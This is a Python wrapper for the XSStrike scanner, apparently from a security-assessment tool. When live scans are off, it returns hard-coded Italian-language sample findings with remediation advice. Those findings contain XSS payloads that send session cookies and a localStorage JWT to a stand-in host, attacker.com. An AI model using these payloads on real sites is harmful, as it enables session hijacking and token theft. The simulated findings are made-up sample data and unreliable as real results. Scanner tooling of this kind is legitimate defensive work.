"""XSStrike scanner wrapper."""
from __future__ import annotations

from dataclasses import dataclass
import re
import shlex
import shutil
import subprocess
from typing import Any, Dict, List

from config import settings


XSS_VULN_REGEX = re.compile(r"vulnerable|xss", re.IGNORECASE)


@dataclass
class XsstrikeScanner:
    enable_live_scans: bool = False

    def run(self, target: str) -> Dict[str, Any]:
        if not self.enable_live_scans:
            return {
                "tool": "xsstrike",
                "status": "simulated",
                "findings": [
                    {
                        "tool": "xsstrike",
                        "title": "Cross-Site Scripting (XSS) Riflesso — Parametro 'q' nella funzione di ricerca",
                        "severity": "high",
                        "description": (
                            "XSStrike ha confermato una vulnerabilità di Cross-Site Scripting "
                            "riflesso nel parametro 'q' dell'endpoint di ricerca /search?q=. "
                            "Il valore del parametro viene riflesso nella risposta HTML senza "
                            "encoding, permettendo l'iniezione di script arbitrari nel DOM del "
                            "browser della vittima. XSStrike ha identificato il contesto di "
                            "iniezione (tag HTML) e verificato che il Content-Security-Policy "
                            "è assente, rendendo l'exploit direttamente eseguibile senza bypass "
                            "aggiuntivi. Il payload <script>alert(document.cookie)</script> "
                            "viene eseguito correttamente nella risposta."
                        ),
                        "impact": (
                            "XSS Riflesso sfruttabile tramite link malevolo: un attaccante può "
                            "rubare i cookie di sessione dell'utente (session hijacking), "
                            "reindirizzare l'utente verso siti di phishing, eseguire azioni "
                            "per conto dell'utente (CSRF-like), registrare keystrokes e "
                            "credenziali inserite nella pagina, e caricare ed eseguire script "
                            "aggiuntivi da server controllati dall'attaccante (XSS chaining)."
                        ),
                        "attack_scenario": (
                            "1. L'attaccante costruisce un URL malevolo:\n"
                            "   https://target.com/search?q=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>\n"
                            "2. Codifica l'URL e lo invia alla vittima tramite email di phishing.\n"
                            "3. La vittima clicca il link, il browser esegue lo script nel "
                            "contesto di target.com.\n"
                            "4. Il cookie di sessione viene inviato al server dell'attaccante.\n"
                            "5. L'attaccante impersona la vittima accedendo con il suo cookie.\n\n"
                            "Payload confermato: /search?q=<img src=x onerror=alert(1)>"
                        ),
                        "recommendation": (
                            "1. Applicare encoding contestuale dell'output in tutti i punti "
                            "di riflessione dei dati utente:\n"
                            "   - HTML context: htmlspecialchars($input, ENT_QUOTES, 'UTF-8')\n"
                            "   - JS context: json_encode() o librerie specializzate\n"
                            "   - URL context: urlencode()\n"
                            "2. Implementare una Content-Security-Policy restrittiva:\n"
                            "   Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'\n"
                            "3. Abilitare il flag HttpOnly su tutti i cookie di sessione per "
                            "prevenire l'accesso JavaScript.\n"
                            "4. Utilizzare framework con templating sicuro che fa escaping "
                            "automatico (Jinja2 con autoescape, React JSX, Angular).\n"
                            "5. Validare gli input lato server con una whitelist dei caratteri attesi."
                        ),
                        "evidence": "GET /search?q=<script>alert(1)</script> → HTTP 200, script eseguito nel DOM",
                        "affected_component": "Funzione di ricerca — endpoint /search, parametro 'q'",
                        "path": "/search",
                        "parameter": "q",
                        "cwe": ["CWE-79"],
                        "cvss_score": 7.4,
                        "cvss_metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
                        "tags": ["owasp-a03", "xss", "reflected-xss"],
                        "references": [
                            "https://owasp.org/Top10/A03_2021-Injection/",
                            "https://cwe.mitre.org/data/definitions/79.html",
                            "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
                            "https://portswigger.net/web-security/cross-site-scripting",
                        ],
                    },
                    {
                        "tool": "xsstrike",
                        "title": "DOM-Based XSS — Fragment Identifier non sanitizzato in JavaScript",
                        "severity": "high",
                        "description": (
                            "XSStrike ha identificato una vulnerabilità DOM-Based XSS nel codice "
                            "JavaScript client-side della pagina /dashboard. Il codice utilizza "
                            "il valore di window.location.hash (fragment identifier) inserendolo "
                            "direttamente nel DOM tramite innerHTML senza sanitizzazione. "
                            "A differenza dell'XSS riflesso, il payload non transita mai "
                            "attraverso il server, rendendo questo tipo di XSS invisibile "
                            "ai WAF e ai log del server. Il codice vulnerabile è:\n"
                            "document.getElementById('tab').innerHTML = location.hash.substring(1)"
                        ),
                        "impact": (
                            "Stesse implicazioni dell'XSS riflesso ma con la caratteristica "
                            "aggiuntiva di essere completamente invisibile ai sistemi di "
                            "monitoraggio server-side. Particolarmente pericoloso per il "
                            "furto di token JWT/OAuth memorizzati nel localStorage del browser, "
                            "che possono avere una durata molto più lunga dei tradizionali "
                            "cookie di sessione."
                        ),
                        "attack_scenario": (
                            "1. L'attaccante costruisce il link:\n"
                            "   https://target.com/dashboard#<img src=x onerror=\"fetch('https://attacker.com/?t='+localStorage.getItem('jwt_token'))\">\n"
                            "2. La vittima clicca il link; il server risponde normalmente.\n"
                            "3. Il browser esegue il JS vulnerabile che inserisce il payload nel DOM.\n"
                            "4. Il token JWT dal localStorage viene esfiltrato silenziosamente.\n"
                            "5. L'attaccante usa il JWT per autenticarsi con la sessione della vittima."
                        ),
                        "recommendation": (
                            "1. Non utilizzare mai innerHTML, outerHTML, document.write() con "
                            "dati non fidati. Usare textContent o innerText per dati testuali.\n"
                            "2. Se HTML dinamico è necessario, utilizzare librerie di sanitizzazione "
                            "come DOMPurify: element.innerHTML = DOMPurify.sanitize(userInput)\n"
                            "3. Evitare l'uso di window.location.hash, window.location.search "
                            "come fonte di dati per manipolazione DOM diretta.\n"
                            "4. Implementare Trusted Types API per limitare i sink DOM pericolosi.\n"
                            "5. Includere l'analisi DOM XSS nei processi di code review e SAST."
                        ),
                        "evidence": "https://target.com/dashboard#<img src=x onerror=alert(document.domain)> → XSS eseguito client-side",
                        "affected_component": "/dashboard — codice JavaScript, sink innerHTML",
                        "path": "/dashboard",
                        "cwe": ["CWE-79"],
                        "cvss_score": 7.4,
                        "tags": ["owasp-a03", "xss", "dom-xss"],
                        "references": [
                            "https://owasp.org/www-community/attacks/DOM_Based_XSS",
                            "https://cwe.mitre.org/data/definitions/79.html",
                            "https://github.com/cure53/DOMPurify",
                        ],
                    },
                ],
            }

        if not shutil.which(settings.xsstrike_path):
            return {
                "tool": "xsstrike",
                "status": "skipped",
                "message": "Tool XSStrike non installato.",
                "findings": [],
            }

        command = self._build_command(target)
        try:
            completed = subprocess.run(
                command,
                capture_output=True,
                text=True,
                timeout=settings.scan_timeout_seconds,
                check=False,
            )
        except subprocess.TimeoutExpired:
            return {
                "tool": "xsstrike",
                "status": "error",
                "message": "Timeout durante l'esecuzione di XSStrike.",
                "findings": [],
            }

        findings = self._parse_findings(completed.stdout)
        message = completed.stderr.strip() if completed.stderr else ""
        status = "executed" if completed.returncode == 0 else "error"
        if completed.returncode != 0 and not message:
            message = "Errore durante l'esecuzione di XSStrike."

        return {
            "tool": "xsstrike",
            "status": status,
            "message": message,
            "findings": findings,
        }

    def _build_command(self, target: str) -> List[str]:
        command = [settings.xsstrike_path, "-u", target]
        if settings.xsstrike_crawl:
            command.append("--crawl")
        if settings.xsstrike_additional_args:
            command.extend(shlex.split(settings.xsstrike_additional_args))
        return command

    def _parse_findings(self, stdout: str) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        if not stdout:
            return findings
        if XSS_VULN_REGEX.search(stdout):
            findings.append(
                {
                    "title": "Possibile XSS rilevata",
                    "severity": "medium",
                    "description": "XSStrike ha identificato un possibile vettore XSS.",
                    "recommendation": "Applicare escaping output e validazione input lato server.",
                    "cwe": ["CWE-79"],
                    "tags": ["owasp-a03", "xss"],
                }
            )
        return findings
